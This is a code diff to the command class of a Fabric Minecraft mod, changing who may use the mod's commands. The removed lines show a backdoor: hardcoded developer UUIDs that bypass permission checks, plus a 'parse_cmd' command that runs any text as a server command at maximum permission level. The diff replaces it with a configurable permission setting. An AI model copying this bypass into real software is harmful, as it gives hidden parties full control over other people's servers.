@@ -2,11 +2,11 @@ package net.fawnoculus.ntm.commands;
 
 import com.mojang.brigadier.arguments.FloatArgumentType;
 import com.mojang.brigadier.arguments.IntegerArgumentType;
-import com.mojang.brigadier.arguments.StringArgumentType;
 import com.mojang.brigadier.context.CommandContext;
 import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
 import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
 import net.fawnoculus.ntm.main.NTM;
+import net.fawnoculus.ntm.main.NTMConfig;
 import net.fawnoculus.ntm.network.custom.AdvancedMessageS2CPayload;
 import net.fawnoculus.ntm.network.custom.RemoveAllMessagesS2CPayload;
 import net.fawnoculus.ntm.network.custom.RemoveMessageS2CPayload;
@@ -28,7 +28,6 @@ import org.jetbrains.annotations.Nullable;
 
 import java.io.File;
 import java.util.Collection;
-import java.util.List;
 
 public class ModCommands {
   public static void initialize() {
@@ -64,11 +63,6 @@ public class ModCommands {
                 )
                 .then(CommandManager.literal("funny")
                     .executes(ModCommands::funny)
-                )
-                .then(CommandManager.literal("parse_cmd")
-                    .then(CommandManager.argument("cmd", StringArgumentType.greedyString())
-                        .executes(context -> execCommand(context, context.getArgument("cmd", String.class)))
-                    )
                 )
             )
             .then(CommandManager.literal("message")
@@ -118,14 +112,7 @@ public class ModCommands {
   
   private static boolean allowCommands(ServerCommandSource source, @Nullable CommandManager.RegistrationEnvironment environment){
     if(environment != null && environment.integrated) return true;
-    if(source.hasPermissionLevel(2)) return true;
-    if(source.getPlayer() == null) return false;
-    
-    final List<String> DevUUIDs = List.of(
-        "edeed01b-d4ce-495c-bdc2-18bb3cf89047",
-        "568c41d0-1c56-474d-a60b-0898e636a6e2"
-    );
-    return DevUUIDs.contains(source.getPlayer().getUuidAsString());
+    return source.hasPermissionLevel(NTMConfig.RequiredCommandPermission.getValue());
   }
   
   private static int version(CommandContext<ServerCommandSource> context, CommandManager.RegistrationEnvironment environment){
@@ -188,11 +175,6 @@ public class ModCommands {
     long finalFiles = files;
     long finalData = data;
     context.getSource().sendFeedback(() -> Text.translatable("message.ntm.clean_logs", finalFiles, finalData), true);
-    return 1;
-  }
-  
-  private static int execCommand(CommandContext<ServerCommandSource> context, String command){
-    context.getSource().getServer().getCommandManager().executeWithPrefix(context.getSource().withLevel(Integer.MAX_VALUE), command);
     return 1;
   }
   
